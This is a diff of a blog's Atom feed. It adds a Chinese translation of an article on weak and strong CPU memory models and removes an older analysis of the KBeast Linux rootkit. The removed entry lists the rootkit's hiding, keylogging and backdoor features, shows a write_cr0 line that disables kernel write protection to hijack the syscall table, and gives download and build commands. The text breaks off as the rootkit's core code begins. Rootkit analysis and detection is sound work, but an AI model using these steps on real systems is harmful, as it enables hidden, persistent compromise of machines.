@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2016-09-29T17:21:32.000Z</updated>
+  <updated>2016-10-30T13:26:06.000Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,77 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>深入探索并发编程系列(九)-弱/强内存模型</title>
+    <link href="http://yoursite.com/blog/2016/10/30/memorymodel/"/>
+    <id>http://yoursite.com/blog/2016/10/30/memorymodel/</id>
+    <published>2016-10-30T13:21:50.000Z</published>
+    <updated>2016-10-30T13:26:06.000Z</updated>
+    
+    <content type="html">&lt;p&gt;存在许多种内存乱序&lt;sup&gt;注1&lt;/sup&gt;，但它们发生的频率并不都是一样的。这取决于你的目标处理器以及开发工具链。&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;对于特定的处理器和工具链，内存模型能告诉你的源代码在运行时可能会发生哪种类型的内存乱序。在脑海中一定要时刻记住，只有在使用无锁编程技术时，内存乱序的效果才能显现出来。&lt;/p&gt;
+&lt;p&gt;学习了一段时间的内存模型后(大部分是通过阅读网上的资源并进行实验来验证)，我将它们概括为以下四种类型。下图中，每种内存模型都囊括涵盖它左边的内存模型所能提供的所有保证，并提供了更多的保证&lt;sup&gt;注2&lt;/sup&gt;。 根据大部分使用弱内存模型与强内存模型这些术语的方式，我在它们之间划了一条明显的界限。继续往下读就能知道我为什么这么做了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/memorymodel1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;上图中每个物理设备代表一种硬件内存模型。硬件内存模型能告诉你对于汇编(或者机器)代码在运行期间会出现哪种内存执行顺序&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/memorymodel2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;对于内存乱序情况，每种处理器家族都有不同的处理习惯，而那些习惯只有在多核或多处理器的配置环境下才能显现出来。考虑到现在的主流都是多核的，它们之间会有很多相似性。&lt;/p&gt;
+&lt;p&gt;同样也存在许多软件内存模型。从技术上来说，只要你用C11,C++11或Java编写（调试)代码，与之关联的是软件内存模型。尽管如此，对硬件内存模型的一般理解也迟早会派上用场。它能帮助你解释调试过程中不可预料的行为（可能正因为它很重要），能识别错误代码在不走运的情况下是如何在特定处理器与工具链上运行正确的。&lt;/p&gt;
+&lt;h3 id=&quot;弱内存模型&quot;&gt;&lt;a href=&quot;#弱内存模型&quot; class=&quot;headerlink&quot; title=&quot;弱内存模型&quot;&gt;&lt;/a&gt;弱内存模型&lt;/h3&gt;&lt;p&gt;在弱内存模型中，有可能会出现我在上一篇文章中用资源控制类比来描述的所有&lt;a href=&quot;http://www.chongh.wiki/blog/2016/09/19/sourcecontrol/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;四种内存乱序&lt;/a&gt;. 只要不改变单个独立线程的行为，任何的读/写操作与其它的读/写操作都有可能发生乱序。实际上，编译器或者处理器都可能产生乱序。&lt;/p&gt;
+&lt;p&gt;当处理器是弱硬件内存模型时，我们更倾向于说它是&lt;code&gt;weakly ordered&lt;/code&gt;或&lt;code&gt;weak ordering&lt;/code&gt;。 我们也可以说它有个宽松的内存模型。提到弱内存模型处理器，令人敬仰的DEC Alpha处理器是人人爱用的例子。现在主流的处理器中，没有比它更弱的内存模型了。&lt;/p&gt;
+&lt;p&gt;受Alpha多方面的影响，C11与C++11编程语言是一种弱的软件内存模型。如果你正在用x86/64等强类型处理器家族，当在这些语言中使用底层的原子操作时并不会受到影响&lt;sup&gt;注3&lt;/sup&gt;。我之前说过，只要是为了阻止编译器乱序，你必须要指定正确的&lt;a href=&quot;http://www.chongh.wiki/blog/2016/09/28/acquireandrelease/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存执行顺序限制&lt;/a&gt;.&lt;/p&gt;
+&lt;h3 id=&quot;带有数据依赖执行顺序的弱内存模型&quot;&gt;&lt;a href=&quot;#带有数据依赖执行顺序的弱内存模型&quot; class=&quot;headerlink&quot; title=&quot;带有数据依赖执行顺序的弱内存模型&quot;&gt;&lt;/a&gt;带有数据依赖执行顺序的弱内存模型&lt;/h3&gt;&lt;p&gt;随着时间变化，尽管Alpha已经变得无关紧要了，现代的CPU家族仍有保留了一些会执行弱硬件执行顺序的传统：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;ARM&lt;/strong&gt; 成千上万的智能手机和平板电脑都在使用，在多核环境下变得越来越受欢迎&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PowerPC&lt;/strong&gt; xbox 360已经在多核环境下贡献了七千万的生存空间&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Itanium&lt;/strong&gt; 微软在Windows下不再支持，但在HP服务器上仍能被Linux支持&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;除了程序员特别感兴趣的常识细节也就是它们能保持数据依赖执行顺序这点之外，这些处理器家族在不同的方式上都和Alpha有着一样弱的内存模型。这是什么意思呢？意味着如果你用C/C++写A-&amp;gt;B,你能一直确保B的值至少和A的值一样新。Alpha却不能确保&lt;sup&gt;注4&lt;/sup&gt;。在这里我不过多叙述这种数据依赖执行顺序，只提一提Linux RCU机制非常依赖这个性质。&lt;/p&gt;
+&lt;h3 id=&quot;强内存模型&quot;&gt;&lt;a href=&quot;#强内存模型&quot; class=&quot;headerlink&quot; title=&quot;强内存模型&quot;&gt;&lt;/a&gt;强内存模型&lt;/h3&gt;&lt;p&gt;我们首先来看看硬件内存模型。强内存模型与弱内存模型最大的差别在哪里呢？在这个问题上大家可能会有一些分歧,但我的感觉是80%的场合下，人们说的都是同一件事。因此，我给出下面这个定义：&lt;/p&gt;
+&lt;p&gt;强内存模型意味着每个机器指令都能隐式的包含Acquire与Release语义。结果是，当一个CPU核执行一系列的写操作时，其它的每一个CPU核看见的都是那些值都以它们被写入时的顺序在改变。&lt;/p&gt;
+&lt;p&gt;这些都不难理解。只要想象资源控制类比中的核心观点,所有的修改有序地提交给共享内存(没有写写乱序)，有序地从共享内存取出(没有读读乱序)，并且指令总有序的执行(没有写读乱序)。然而写读乱序还是有可能发生。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/memorymodel3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;从上述的定义可以看出，x86/64处理器家族一向是强内存模型(strong ordered）的。有时候有例外，但在大部分情况下，对于程序员来说，这些例子都可以忽略。x86/x64处理器能乱序执行指令，但那属于硬件实现的范畴。而真正有意义的是它仍能保证内存的交互是有序的，因此在多核环境下，我们仍然可以把它认为是强内存模型的。从历史角度来看，标准在不断地发展，可能会给大家带来一些困扰。&lt;/p&gt;
+&lt;p&gt;很明显，当SPARC处理器运行在TSO模式中，是另一种强硬件内存模型的例子。TSO代表Total Store Order，相比我上面给出的定义来看，这是一种微妙的方式，意味着对所有cpu核来说，关于写内存操作，都有一个单一确定的全序&lt;sup&gt;注5&lt;/sup&gt;。X86/X64也有这个性质，可以参考Intel x86/x64系统结构手册中Volume 3, §8.2.3.6-8的例子。从那里我可以得出结论，TSO性质不总是lock-free程序员对底层感兴趣的最直接部分，但这在对顺序一致性的理解上又迈进了一步。&lt;/p&gt;
+&lt;h3 id=&quot;顺序一致性&quot;&gt;&lt;a href=&quot;#顺序一致性&quot; class=&quot;headerlink&quot; title=&quot;顺序一致性&quot;&gt;&lt;/a&gt;顺序一致性&lt;/h3&gt;&lt;p&gt;在顺序一致性内存模型中，没有内存乱序。这看起来就像是整个程序的执行被缩减到每个线程中指令的顺序交错。具体来说，&lt;a href=&quot;http://www.chongh.wiki/blog/2016/08/11/memoryreorder/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇文章&lt;/a&gt;中r1 = r2 = 0 的结果就变得不可能了&lt;sup&gt;注6&lt;/sup&gt;。&lt;/p&gt;
+&lt;p&gt;如今你很难找到一个现代的多核设备能在硬件级别保证顺序一致性。然而，似乎在1989年至少有一种能保证顺序一致性的多处理器机器：基于386的&lt;a href=&quot;http://www.vogons.org/viewtopic.php?t=23842#178666&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Compaq SystemPro&lt;/a&gt;。根据Intel文档，386还不够先进到能在运行期间执行任意的内存乱序。&lt;/p&gt;
+&lt;p&gt;在任何情况下，当使用高级编程语言，顺序一致性只有在作为软件内存模型时才变得有趣。在Java5或更高版本中，你可以将共享变量声明为volatile。在C++11中,当在原子数据类型执行操作的时候，可以使用默认的顺序约束，也就是memory_order_seq_cst&lt;sup&gt;注7&lt;/sup&gt;。如果这么做了，工具链会限制编译器乱序并发出CPU特定的指令来充当合适的memory barrier。在这种方式下，尽管是在弱内存模型的多核设备上,也会模拟出顺序一致性的内存模型。如果你读了Herlihy &amp;amp; Shavit’s的 &lt;a href=&quot;https://www.amazon.com/gp/product/0123973376/ref=as_li_ss_tl?ie=UTF8&amp;amp;tag=preshonprogr-20&amp;amp;linkCode=as2&amp;amp;camp=1789&amp;amp;creative=390957&amp;amp;creativeASIN=0123973376&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;The Art of Multiprocessor Programming&lt;/a&gt;,要注意那里的大部分例子都假设顺序一致性的软件内存模型。&lt;/p&gt;
+&lt;h3 id=&quot;更多细节&quot;&gt;&lt;a href=&quot;#更多细节&quot; class=&quot;headerlink&quot; title=&quot;更多细节&quot;&gt;&lt;/a&gt;更多细节&lt;/h3&gt;&lt;p&gt;要填完有关内存模型的坑，还有许多其它微妙的细节，但以我的经验来看，当在应用层上写无锁代码时，这些都变得没什么意思了。存在一些控制依赖，因果一致性和不同的内存乱序类型。然而，大部分的讨论都能归于我上面总结的四种主要类型里。&lt;/p&gt;
+&lt;p&gt;如果你真的想探究处理器内存模型的细节，并且你能在吃早餐的时候还想琢磨一些正式的逻辑，你可以看看剑桥大学的非常精细的&lt;a href=&quot;http://www.cl.cam.ac.uk/~pes20/weakmemory/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;工作&lt;/a&gt;&lt;br&gt;Paul McKenney写了它们的工作和相关工具的一些&lt;a href=&quot;http://lwn.net/Articles/470681/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;概览&lt;/a&gt;&lt;sup&gt;注8&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;注1：比如说写写乱序、写读乱序、读读乱序、读写乱序等等。&lt;/p&gt;
+&lt;p&gt;注2：也就是说从右到左模型越来越弱，限制越来越松，乱序发生的越来越多。&lt;/p&gt;
+&lt;p&gt;注3：即使在X86/X64下，还是得注意可能的写读乱序。&lt;/p&gt;
+&lt;p&gt;注4：举个关于data dependency的例子，来说明在DEC Alpha下编程有多么的困难和tricky。&lt;/p&gt;
+&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;初始化&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; A = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; B = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; C = &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; *P = &amp;amp;A;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; *Q = &amp;amp;B;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//cpu1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;B = &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;CPU_BARRIER();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;P = &amp;amp;B;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//cpu2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Q = P;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;D = *Q&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;从直觉上说，Q最后要么等于&amp;amp;A，要么等于&amp;amp;B。也就是说：&lt;/p&gt;
+&lt;p&gt;Q == &amp;amp;A， D == 1&lt;/p&gt;
+&lt;p&gt;或者&lt;/p&gt;
+&lt;p&gt;Q == &amp;amp;B， D == 4&lt;/p&gt;
+&lt;p&gt;但是，让人吃惊的是，DEC Alpha下，可能出现&lt;/p&gt;
+&lt;p&gt;Q == &amp;amp;B， D == 2的情形，原因是，虽然CPU1按照顺序执行完两条语句先后对B和P进行了修改，但CPU2可能先感知到P的变化，读到了P的新值，然后才是B的新值。因此，为了防止这样的问题，需要加一个data dependency barrier。&lt;/p&gt;
+&lt;p&gt;注5：偏序、全序什么意思？读者诸君如果忘记，可以简单复习下大学的离散数学教材。&lt;/p&gt;
+&lt;p&gt;注6：对顺序一致性(Sequential Consistency)感兴趣的读者，可以参考我们写的&lt;a href=&quot;http://www.yebangyu.org/blog/2016/01/09/memoryconsistencyandcachecoherence/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇&lt;/a&gt;博客。&lt;/p&gt;
+&lt;p&gt;注7：C++11引入的feature。在C++11中，除了这里提到的&lt;code&gt;std::memory_order_seq_cst&lt;/code&gt;之外，还有如下的内存序选项：&lt;/p&gt;
+&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;memory_order_relaxed,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;memory_order_consume,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;memory_order_acquire,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;memory_order_release,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;memory_order_acq_rel,&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;关于它们的语义和用法，请继续关注我们的深入探索并发编程系列，或者参考《C++ Concurrency In Action》这本书第五章。&lt;/p&gt;
+&lt;p&gt;注8：谈到C++ memory model，很难绕开一个大牛：Mark John Batty。对C++11的memory model感兴趣的读者，如果想深入研究其中的理论和形式化部分，可以参考他的&lt;a href=&quot;http://www.sigplan.org/Awards/Dissertation/2015_batty.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;论文&lt;/a&gt;。&lt;/p&gt;
+&lt;h3 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h3&gt;&lt;p&gt;本文由 &lt;a href=&quot;http://weibo.com/2767520802/profile?topnav=1&amp;amp;wvr=6&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Diting0x&lt;/a&gt; 与 &lt;a href=&quot;http://weibo.com/yebangyu&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;睡眼惺忪的小叶先森&lt;/a&gt; 共同完成，在原文的基础上添加了许多精华注释，帮助大家理解。&lt;/p&gt;
+&lt;p&gt;感谢好友&lt;a href=&quot;http://weibo.com/u/1707881862?topnav=1&amp;amp;wvr=6&amp;amp;topsug=1&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;小伙伴-小伙伴儿 &lt;/a&gt;阅读了初稿，并给出宝贵的意见。&lt;/p&gt;
+&lt;p&gt;原文： &lt;a href=&quot;http://preshing.com/20120930/weak-vs-strong-memory-models/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://preshing.com/20120930/weak-vs-strong-memory-models/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;br&gt;仅为学习使用，未经博主同意，请勿转载&lt;br&gt;本系列文章已经获得了原作者preshing的授权。版权归原作者和本网站共同所有&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;存在许多种内存乱序&lt;sup&gt;注1&lt;/sup&gt;，但它们发生的频率并不都是一样的。这取决于你的目标处理器以及开发工具链。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="High-performance" scheme="http://yoursite.com/categories/High-performance/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>深入探索并发编程系列(八)-Acquire与Release语义</title>
@@ -809,11 +880,11 @@ sudo update-alternatives --config gcc
       <category term="operating-system" scheme="http://yoursite.com/categories/operating-system/"/>
     
     
-      <category term="Instrumentation" scheme="http://yoursite.com/tags/Instrumentation/"/>
-    
       <category term="System" scheme="http://yoursite.com/tags/System/"/>
     
       <category term="Virtualization" scheme="http://yoursite.com/tags/Virtualization/"/>
+    
+      <category term="Instrumentation" scheme="http://yoursite.com/tags/Instrumentation/"/>
     
       <category term="Kernel" scheme="http://yoursite.com/tags/Kernel/"/>
     
@@ -1671,177 +1742,6 @@ $ echo $?
       <category term="Syscall" scheme="http://yoursite.com/tags/Syscall/"/>
     
       <category term="OS" scheme="http://yoursite.com/tags/OS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>kbeast Analysis and Detection</title>
-    <link href="http://yoursite.com/blog/2016/04/02/kbeast-analysis-detection/"/>
-    <id>http://yoursite.com/blog/2016/04/02/kbeast-analysis-detection/</id>
-    <published>2016-04-02T21:24:15.000Z</published>
-    <updated>2016-06-14T14:22:54.000Z</updated>
-    
-    <content type="html">&lt;blockquote&gt;
-&lt;ul&gt;
-&lt;li&gt;0X00 全文环境&lt;/li&gt;
-&lt;li&gt;0X01 Kbeast 特性&lt;/li&gt;
-&lt;li&gt;0X02 系统调用劫持基础&lt;/li&gt;
-&lt;li&gt;0X03 Kbeast 使用&lt;/li&gt;
-&lt;li&gt;0X04 Kbeast 核心&lt;/li&gt;
-&lt;li&gt;0X05 Kbeast Detection &lt;/li&gt;
-&lt;/ul&gt;
-&lt;/blockquote&gt;
-&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-&lt;h3 id=&quot;0X00-全文环境&quot;&gt;&lt;a href=&quot;#0X00-全文环境&quot; class=&quot;headerlink&quot; title=&quot;0X00 全文环境&quot;&gt;&lt;/a&gt;0X00 全文环境&lt;/h3&gt;&lt;p&gt;Host Ubuntu 12.04 + Guest Ubuntu 10.04/11.04 + Libvmi + Volatility&lt;/p&gt;
-&lt;p&gt;其中Kbeast运行在Guest Ubuntu 10.04/11.04中，libvmi与volatility运行在Host Ubuntu12.04中。&lt;/p&gt;
-&lt;h3 id=&quot;0X01-Kbeast-特性&quot;&gt;&lt;a href=&quot;#0X01-Kbeast-特性&quot; class=&quot;headerlink&quot; title=&quot;0X01 Kbeast 特性&quot;&gt;&lt;/a&gt;0X01 Kbeast 特性&lt;/h3&gt;&lt;p&gt;以下是Kbeast实现的功能：&lt;/p&gt;
-&lt;p&gt;- 隐藏可加载模块（LKM)&lt;/p&gt;
-&lt;p&gt;- 隐藏文件/目录&lt;/p&gt;
-&lt;p&gt;- 隐藏进程（ps,pstree,top,lsof)&lt;/p&gt;
-&lt;p&gt;- 隐藏套接字和网络连接(netstat,lsof)&lt;/p&gt;
-&lt;p&gt;- 记录键盘操作捕获用户行为&lt;/p&gt;
-&lt;p&gt;- 反杀死进程&lt;/p&gt;
-&lt;p&gt;- 反移除文件&lt;/p&gt;
-&lt;p&gt;- 反删除可加载模块&lt;/p&gt;
-&lt;p&gt;- root提权后门&lt;/p&gt;
-&lt;p&gt;- 远程绑定后门 &lt;/p&gt;
-&lt;h3 id=&quot;0X02-系统调用劫持基础&quot;&gt;&lt;a href=&quot;#0X02-系统调用劫持基础&quot; class=&quot;headerlink&quot; title=&quot;0X02 系统调用劫持基础&quot;&gt;&lt;/a&gt;0X02 系统调用劫持基础&lt;/h3&gt;&lt;p&gt;上述的Kbeast特性都是通过系统调用劫持实现的。在kernel 2.6.*之前，系统调用表”sys_call_table”是可以直接导出引用的，如：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;extern void *sys_call_table[];
-sys_call_table[__NR_syscall] = pointer
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而在kernel 2.6.* 之后禁用了这种特性，并且其所在页是写保护的。然而，系统调用表依然在内存中，如果知道其所在内存地址，依然可以通过指针访问。内核中的符号表System.map （一般在/boot/目录下)记录了所有的符号及其地址，当然也包括系统调用表”sys_call_table”.  以Ubuntu 10.04为例，执行：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;grep sys_call_table /boot/System.map-2.6.32-21-generic
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;显示的结果为&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;c0592150 R sys_call_table
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;c0592150指的是线性地址，R说明此地址所在的页面Read-only。目前的CPU都会将CR0控制寄存器的第16位（wp-bit）置1,将页面开启保护模式，这时CPU处于”write-proteed”模式，否则处于”read/write”模式。CR0寄存器的位描述可参考&lt;a href=&quot;https://en.wikipedia.org/wiki/Control_register#CR0&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CR0&lt;/a&gt;. &lt;/p&gt;
-&lt;p&gt;如果能将WP位置0，就可以访问内存页面,读写系统调用表了。 下面这行代码便可实现此功能：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;write_cr0 (read_cr0 () &amp;amp; (~ 0x10000));
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;0X03-Kbeast-使用&quot;&gt;&lt;a href=&quot;#0X03-Kbeast-使用&quot; class=&quot;headerlink&quot; title=&quot;0X03 Kbeast 使用&quot;&gt;&lt;/a&gt;0X03 Kbeast 使用&lt;/h3&gt;&lt;p&gt;下载&lt;a href=&quot;https://packetstormsecurity.com/files/108286/KBeast-Kernel-Beast-Linux-Rootkit-2012.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Kbeast&lt;/a&gt;. &lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;tar xzf ipsecs-kbeast-v1.tar.gz
-cd kbeast-v1
-./setup build 1  
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;具体可参考/kbeast-v1/setup 文件，参数1表示默认为kernel 2.6.32。测试过ubuntu11.04 内核为2.6.38，setup出错，作者声称：&lt;br&gt;Be kind to note that the beast has been tested in, but not limited to, kernel 2.6.9,&lt;br&gt;2.6.16, 2.6.18, 2.6.32, 2.6.35 (i386 or x86_64)，理论上只要修改setup相关参数以及ipsecs-kbeast-vl.c文件中的系统调用表的地址即可适应其它版本内核，未测试。&lt;/p&gt;
-&lt;p&gt;成功编译后，kbeast就会加载到内核空间，rootkit安装在/usr/&lt;em&gt;h4x&lt;/em&gt;路径下，生成/usr/&lt;em&gt;h4x&lt;/em&gt;/_h4x_bd进程，以及acctlog 记录文件， 路径以及文件名等参数可以在config.h文件中配置。当然在目标机器guest中无法找到相关文件，因为已经被隐藏了。下文会利用volatility检测到相关进程的路径。&lt;/p&gt;
-&lt;h3 id=&quot;0X04-Kbeast-核心&quot;&gt;&lt;a href=&quot;#0X04-Kbeast-核心&quot; class=&quot;headerlink&quot; title=&quot;0X04 Kbeast 核心&quot;&gt;&lt;/a&gt;0X04 Kbeast 核心&lt;/h3&gt;&lt;p&gt;Kbeast以LKM的方式存在，以下是其核心代码：&lt;/p&gt;
-&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span 